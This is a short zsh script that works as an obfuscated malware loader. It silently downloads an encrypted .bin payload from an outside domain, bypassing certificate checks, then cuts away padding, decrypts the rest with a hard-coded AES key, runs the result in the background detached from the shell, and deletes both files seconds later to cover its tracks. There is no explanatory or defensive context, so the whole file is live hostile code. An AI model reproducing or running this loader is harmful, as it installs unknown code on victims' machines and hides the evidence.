#!/bin/zsh
xujan=$(mktemp /tmp/9tmvvf.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m6ce20c6b7477cad9.bin" -o "$xujanz" || exit 1
m9qpb3=$(stat -f %z "$xujanz"); xe6phkg=$(( m9qpb3 - 3021 - 1975 ))
tail -c +$(( 3021 + 1 )) "$xujanz" | head -c $xe6phkg | openssl enc -d -aes-256-cbc -k b6fdc118363002b68ca74c4a -out "$xujan" 2>/dev/null
[ -s "$xujan" ] && chmod 700 "$xujan" && ( "$xujan" & ) && disown
( sleep 3; rm -f "$xujan" "$xujanz" ) &>/dev/null &
